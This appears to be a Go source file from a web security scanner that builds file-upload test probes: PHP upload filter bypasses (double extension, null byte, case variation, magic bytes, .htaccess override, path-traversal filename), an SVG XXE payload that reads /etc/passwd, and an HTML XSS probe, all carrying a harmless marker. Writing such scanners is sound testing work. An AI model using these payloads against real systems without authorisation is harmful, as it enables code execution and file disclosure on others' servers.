package file_upload_scan

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
)

// uploadProbe defines a single file upload test case.
type uploadProbe struct {
	name        string
	filename    string
	contentType string
	body        string
	probeType   string // "rce", "xxe", "xss"
}

// generateMarker creates a unique marker for each scan to verify upload execution.
func generateMarker() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return "vigolium-upload-test-" + hex.EncodeToString(b)
}

// buildProbes creates the set of upload probes with a unique marker.
func buildProbes(marker string) []uploadProbe {
	phpBody := fmt.Sprintf("<?php echo '%s'; ?>", marker)
	svgBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text x="0" y="20">%s &xxe;</text>
</svg>`, marker)
	htmlBody := fmt.Sprintf(`<html><body><script>document.write('%s')</script></body></html>`, marker)

	return []uploadProbe{
		{
			name:        "Direct PHP",
			filename:    "test.php",
			contentType: "application/x-php",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "Double Extension",
			filename:    "test.php.jpg",
			contentType: "image/jpeg",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "Null Byte",
			filename:    "test.php%00.jpg",
			contentType: "image/jpeg",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "Case Variation",
			filename:    "test.pHp",
			contentType: "application/x-php",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "Magic Bytes (JPEG header + PHP)",
			filename:    "test.php",
			contentType: "image/jpeg",
			body:        "\xff\xd8\xff\xe0" + phpBody, // JPEG magic bytes + PHP code
			probeType:   "rce",
		},
		{
			name:        "SVG XXE",
			filename:    "test.svg",
			contentType: "image/svg+xml",
			body:        svgBody,
			probeType:   "xxe",
		},
		{
			name:        "HTML XSS",
			filename:    "test.html",
			contentType: "text/html",
			body:        htmlBody,
			probeType:   "xss",
		},
		{
			name:        ".htaccess Upload",
			filename:    ".htaccess",
			contentType: "application/octet-stream",
			body:        "AddType application/x-httpd-php .txt",
			probeType:   "rce",
		},
		{
			name:        "PHTML Extension",
			filename:    "test.phtml",
			contentType: "application/x-php",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "PHAR Extension",
			filename:    "test.phar",
			contentType: "application/x-php",
			body:        phpBody,
			probeType:   "rce",
		},
		{
			name:        "Path Traversal Filename",
			filename:    "../test.php",
			contentType: "application/x-php",
			body:        phpBody,
			probeType:   "rce",
		},
	}
}
